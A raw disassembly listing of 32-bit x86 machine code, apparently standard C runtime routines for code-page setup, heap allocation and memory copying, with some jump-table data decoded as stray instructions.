  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
